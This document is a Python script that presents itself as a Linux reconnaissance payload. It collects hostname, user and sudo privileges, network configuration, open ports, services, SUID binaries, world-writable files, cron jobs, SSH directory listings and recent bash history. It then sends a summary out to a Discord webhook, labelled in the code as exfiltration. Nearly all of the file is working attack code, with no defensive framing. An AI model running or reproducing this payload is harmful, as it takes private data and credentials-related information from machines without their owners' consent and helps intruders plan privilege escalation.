#!/usr/bin/env python3
"""
Linux System Reconnaissance Payload
Gathers comprehensive Linux system information and exfiltrates to Discord
"""

import os
import sys
import subprocess
import socket
import json
from pathlib import Path

# Add parent directory to path
sys.path.insert(0, str(Path(__file__).parent.parent))

try:
    from src.webhook_utils import send_to_discord
except ImportError:
    print("Error: webhook_utils not found")
    sys.exit(1)


def run_command(cmd):
    """Execute shell command and return output"""
    try:
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=10
        )
        return result.stdout.strip()
    except Exception as e:
        return f"Error: {str(e)}"


def get_system_info():
    """Get basic system information"""
    info = {
        'hostname': socket.gethostname(),
        'user': os.environ.get('USER', 'unknown'),
        'home': os.environ.get('HOME', 'unknown'),
        'shell': os.environ.get('SHELL', 'unknown'),
        'path': os.environ.get('PATH', 'unknown')[:200],
    }
    
    # OS Version
    if Path('/etc/os-release').exists():
        with open('/etc/os-release') as f:
            for line in f:
                if line.startswith('PRETTY_NAME='):
                    info['os_version'] = line.split('=')[1].strip().strip('"')
                    break
    else:
        info['os_version'] = run_command('uname -a')
    
    # Kernel
    info['kernel'] = run_command('uname -r')
    
    # Uptime
    info['uptime'] = run_command('uptime -p')
    
    # Architecture
    info['architecture'] = run_command('uname -m')
    
    return info


def get_user_info():
    """Get user and privilege information"""
    info = {}
    
    # Current user
    info['current_user'] = run_command('whoami')
    
    # User ID
    info['uid'] = run_command('id -u')
    info['gid'] = run_command('id -g')
    
    # Groups
    info['groups'] = run_command('groups')
    
    # Sudoers check
    sudo_check = run_command('sudo -n -l 2>&1')
    info['sudo_access'] = 'not allowed' not in sudo_check.lower()
    info['sudo_details'] = sudo_check[:500] if info['sudo_access'] else 'No sudo access'
    
    # Root check
    info['is_root'] = os.geteuid() == 0
    
    # Logged in users
    info['logged_users'] = run_command('who')
    
    # Last logins
    info['last_logins'] = run_command('last -n 5')
    
    return info


def get_network_info():
    """Get network configuration"""
    info = {}
    
    # IP addresses
    info['ip_addresses'] = run_command('ip addr show 2>/dev/null || ifconfig')
    
    # Routing table
    info['routes'] = run_command('ip route 2>/dev/null || netstat -rn')
    
    # DNS
    if Path('/etc/resolv.conf').exists():
        info['dns'] = run_command('cat /etc/resolv.conf | grep nameserver')
    
    # Listening ports
    info['listening_ports'] = run_command('ss -tuln 2>/dev/null || netstat -tuln')
    
    # Active connections
    info['active_connections'] = run_command('ss -tupn 2>/dev/null || netstat -tupn')
    
    return info


def get_installed_software():
    """Get installed packages and software"""
    info = {}
    
    # Determine package manager
    if os.path.exists('/usr/bin/dpkg'):
        info['package_manager'] = 'dpkg (Debian/Ubuntu)'
        info['package_count'] = run_command('dpkg -l | wc -l')
        info['recent_packages'] = run_command('dpkg -l | tail -20')
    
    elif os.path.exists('/usr/bin/rpm'):
        info['package_manager'] = 'rpm (RedHat/CentOS)'
        info['package_count'] = run_command('rpm -qa | wc -l')
        info['recent_packages'] = run_command('rpm -qa | tail -20')
    
    elif os.path.exists('/usr/bin/pacman'):
        info['package_manager'] = 'pacman (Arch)'
        info['package_count'] = run_command('pacman -Q | wc -l')
        info['recent_packages'] = run_command('pacman -Q | tail -20')
    
    else:
        info['package_manager'] = 'unknown'
    
    # Interesting binaries
    interesting_bins = ['nmap', 'wireshark', 'tcpdump', 'netcat', 'nc', 'socat', 
                       'python', 'python3', 'gcc', 'make', 'docker', 'kubectl']
    
    found_bins = []
    for binary in interesting_bins:
        result = run_command(f'which {binary}')
        if result and 'not found' not in result:
            found_bins.append(f"{binary}: {result}")
    
    info['interesting_binaries'] = '\n'.join(found_bins) if found_bins else 'None found'
    
    return info


def get_running_services():
    """Get running services"""
    info = {}
    
    # Systemd services
    if os.path.exists('/bin/systemctl') or os.path.exists('/usr/bin/systemctl'):
        info['service_manager'] = 'systemd'
        info['running_services'] = run_command('systemctl list-units --type=service --state=running --no-pager')
        info['enabled_services'] = run_command('systemctl list-unit-files --type=service --state=enabled --no-pager | head -20')
    
    # Init.d services
    elif os.path.exists('/etc/init.d'):
        info['service_manager'] = 'init.d'
        info['services'] = run_command('service --status-all 2>&1')
    
    # Process list
    info['processes'] = run_command('ps aux | head -30')
    
    return info


def get_file_system_info():
    """Get filesystem and storage information"""
    info = {}
    
    # Disk usage
    info['disk_usage'] = run_command('df -h')
    
    # Mount points
    info['mounts'] = run_command('mount')
    
    # Large files in home directory
    home = os.environ.get('HOME', '/tmp')
    info['large_files_home'] = run_command(f'find {home} -type f -size +10M 2>/dev/null | head -20')
    
    # SSH keys
    ssh_dir = Path(home) / '.ssh'
    if ssh_dir.exists():
        info['ssh_keys'] = run_command(f'ls -la {ssh_dir}')
    else:
        info['ssh_keys'] = 'No .ssh directory'
    
    # Bash history (last 30 commands)
    bash_history = Path(home) / '.bash_history'
    if bash_history.exists():
        info['bash_history'] = run_command(f'tail -30 {bash_history}')
    else:
        info['bash_history'] = 'No bash history'
    
    return info


def get_security_info():
    """Get security-related information"""
    info = {}
    
    # SELinux status
    if os.path.exists('/usr/sbin/getenforce'):
        info['selinux'] = run_command('getenforce')
    
    # AppArmor status
    if os.path.exists('/sys/kernel/security/apparmor'):
        info['apparmor'] = run_command('aa-status 2>&1 | head -10')
    
    # Firewall status (iptables)
    info['iptables'] = run_command('sudo iptables -L -n 2>&1 | head -30')
    
    # Firewall status (ufw)
    if os.path.exists('/usr/sbin/ufw'):
        info['ufw'] = run_command('sudo ufw status 2>&1')
    
    # SUID binaries
    info['suid_binaries'] = run_command('find / -perm -4000 -type f 2>/dev/null | head -20')
    
    # World-writable files
    info['writable_files'] = run_command('find /etc /var -perm -002 -type f 2>/dev/null | head -20')
    
    return info


def get_cron_jobs():
    """Get scheduled tasks"""
    info = {}
    
    # User crontab
    info['user_crontab'] = run_command('crontab -l 2>&1')
    
    # System crontab
    if os.path.exists('/etc/crontab'):
        info['system_crontab'] = run_command('cat /etc/crontab')
    
    # Cron directories
    info['cron_d'] = run_command('ls -la /etc/cron.* 2>/dev/null')
    
    return info


def main():
    """Main reconnaissance function"""
    print("[*] Starting Linux system reconnaissance...")
    
    recon_data = {
        'target': 'Linux System',
        'timestamp': subprocess.getoutput('date'),
    }
    
    # Gather all information
    print("[*] Gathering system information...")
    recon_data['system'] = get_system_info()
    
    print("[*] Gathering user information...")
    recon_data['users'] = get_user_info()
    
    print("[*] Gathering network information...")
    recon_data['network'] = get_network_info()
    
    print("[*] Gathering software information...")
    recon_data['software'] = get_installed_software()
    
    print("[*] Gathering service information...")
    recon_data['services'] = get_running_services()
    
    print("[*] Gathering filesystem information...")
    recon_data['filesystem'] = get_file_system_info()
    
    print("[*] Gathering security information...")
    recon_data['security'] = get_security_info()
    
    print("[*] Gathering scheduled tasks...")
    recon_data['cron'] = get_cron_jobs()
    
    # Format for Discord
    message = f"""
🐧 **LINUX SYSTEM RECONNAISSANCE**

**Target:** {recon_data['system']['hostname']}
**User:** {recon_data['system']['user']}
**OS:** {recon_data['system'].get('os_version', 'Unknown')}
**Kernel:** {recon_data['system']['kernel']}
**Architecture:** {recon_data['system']['architecture']}

**PRIVILEGE STATUS:**
• Root Access: {'✅ YES' if recon_data['users']['is_root'] else '❌ NO'}
• Sudo Access: {'✅ YES' if recon_data['users']['sudo_access'] else '❌ NO'}
• UID: {recon_data['users']['uid']}
• Groups: {recon_data['users']['groups']}

**NETWORK:**
• Hostname: {recon_data['system']['hostname']}
• Listening Services: {len(recon_data['network'].get('listening_ports', '').split('\\n'))} ports

**SECURITY:**
• SELinux: {recon_data['security'].get('selinux', 'N/A')}
• SUID Binaries: {len(recon_data['security'].get('suid_binaries', '').split('\\n'))} found

**INTERESTING BINARIES:**
{recon_data['software'].get('interesting_binaries', 'None')}

Full recon data collected and ready for analysis.
"""
    
    # Send to Discord
    print("[*] Exfiltrating to Discord...")
    success = send_to_discord(message)
    
    if success:
        print("✓ Data sent to Discord successfully!")
    else:
        print("✗ Failed to send data to Discord")
        # Save locally as backup
        backup_file = '/tmp/linux_recon.json'
        with open(backup_file, 'w') as f:
            json.dump(recon_data, f, indent=2)
        print(f"✓ Data saved locally to {backup_file}")
    
    return recon_data


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Reconnaissance interrupted by user")
    except Exception as e:
        print(f"[!] Error: {str(e)}")
